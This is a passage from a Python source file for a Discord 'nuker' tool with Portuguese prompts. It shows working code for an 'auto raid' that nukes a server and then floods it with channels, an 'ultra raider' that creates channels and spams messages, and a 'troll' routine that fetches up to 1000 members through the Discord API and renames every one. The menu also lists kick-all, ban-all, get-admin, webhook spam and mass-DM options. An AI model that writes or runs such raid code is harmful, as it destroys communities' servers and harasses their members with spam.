                                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}dms sent! {AZUL}user:{str(member_id)[:8]}{NC}")

                    return sent
        except:
            return 0

    # ============================================
    # OPÇÃO 11: AUTO RAID (IMPROVEMENT)
    # ============================================
    async def auto_raid(self):
        print(f"{BRANCO}{{{AZUL}auto raid{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}quantidade de canais: {NC}", end="")
            count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}nome dos canais: {NC}", end="")
            name = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}iniciando auto raid...{NC}")

        await self.nuke_server()
        await asyncio.sleep(0.5)

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}criando {count} novos canais...{NC}")
        await self._create_channels_impossible(count, name)

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}auto raid completo!{NC}")

    # ============================================
    # OPÇÃO 12: ULTRA RAIDER (IMPROVEMENT)
    # ============================================
    async def ultra_raider(self):
        print(f"{BRANCO}{{{AZUL}ultra raider{BRANCO}}}{NC}")

        try:
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}quantidade de canais: {NC}", end="")
            channel_count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}nome dos canais: {NC}", end="")
            channel_name = input().strip()
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}mensagens por canal: {NC}", end="")
            message_count = int(input().strip())
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}texto das mensagens: {NC}", end="")
            message_text = input().strip()
        except:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}entrada inválida{NC}")
            return

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}iniciando ultra raider...{NC}")

        created = await self._create_channels_impossible(channel_count, channel_name)
        await asyncio.sleep(0.3)

        if created > 0:
            print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}spammando mensagens...{NC}")
            await self._spam_messages_impossible(message_count, message_text)

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}ultra raider completo!{NC}")

    # ============================================
    # OPÇÃO 13: TROLL (IMPROVEMENT)
    # ============================================
    async def troll(self):
        print(f"{BRANCO}{{{AZUL}troll{BRANCO}}}{NC}")

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}novo nickname: {NC}", end="")
        nickname = input().strip()

        if not nickname:
            print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}nickname não pode ser vazio{NC}")
            return

        print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}confirmar? (s/n): {NC}", end="")
        confirm = input().strip().lower()
        if confirm != 's':
            return

        await self.rate_limiter.initialize()
        session = self.rate_limiter.get_impossible_session()

        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}obtendo membros do servidor...{NC}")

        members_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members?limit=1000"

        async with session.get(members_url) as response:
            if response.status != 200:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro obtendo membros{NC}")
                return
            members = await response.json()

        member_ids = []
        for member in members:
            if isinstance(member, dict) and 'user' in member:
                member_ids.append(member['user']['id'])

        if not member_ids:
            print(f"{BRANCO}[{AZUL}!{BRANCO}] {BRANCO}nenhum membro encontrado{NC}")
            return

        total = len(member_ids)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}alterando nickname de {total} membros...{NC}")

        tasks = []
        for i, member_id in enumerate(member_ids):
            change_url = f"https://discord.com/api/v9/guilds/{self.guild_id}/members/{member_id}"
            data = {"nick": nickname}

            task = self.rate_limiter.safe_request_impossible(
                'members_kick',
                self._change_nickname_impossible,
                session, change_url, data, i+1, total, member_id
            )
            tasks.append(task)

        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}nicknames alterados{NC}")

    async def _change_nickname_impossible(self, session, url, data, current, total, member_id):
        try:
            async with session.patch(url, json=data, timeout=15) as response:
                if response.status in [200, 204]:
                    print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}{current}/{total} {BRANCO}nickname changed! {AZUL}user:{str(member_id)[:8]}{NC}")
                    return True
                return False
        except:
            return False

    # ============================================
    # MAIN LOOP
    # ============================================
    async def main(self):
        while True:
            choice = self.show_menu()

            if choice == "01" or choice == "1":
                await self.nuke_server()
            elif choice == "02" or choice == "2":
                await self.create_channels()
            elif choice == "03" or choice == "3":
                await self.spam_messages()
            elif choice == "04" or choice == "4":
                await self.webhook_spam()
            elif choice == "05" or choice == "5":
                await self.kick_all()
            elif choice == "06" or choice == "6":
                await self.ban_all()
            elif choice == "07" or choice == "7":
                await self.create_roles()
            elif choice == "08" or choice == "8":
                await self.get_admin()
            elif choice == "09" or choice == "9":
                await self.change_server()
            elif choice == "10":
                await self.dm_all()
            elif choice == "11":
                await self.auto_raid()
            elif choice == "12":
                await self.ultra_raider()
            elif choice == "13":
                await self.troll()
            elif choice == "00" or choice == "0":
                print(f"{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}saindo...{NC}")
                break
            else:
                print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}opcao invalida!{NC}")

            print("")
            print(f"{BRANCO}[{AZUL}*{BRANCO}] {BRANCO}pressione enter para continuar...{NC}")
            input()

# ============================================
# PONTO DE ENTRADA
# ============================================
if __name__ == "__main__":
    try:
        nuker = RevolutionNukerImpossible()
        asyncio.run(nuker.main())
    except KeyboardInterrupt:
        print(f"\n{BRANCO}[{AZUL}+{BRANCO}] {BRANCO}saindo...{NC}")
    except Exception as e:
        print(f"{BRANCO}[{AZUL}-{BRANCO}] {BRANCO}erro: {e}{NC}")
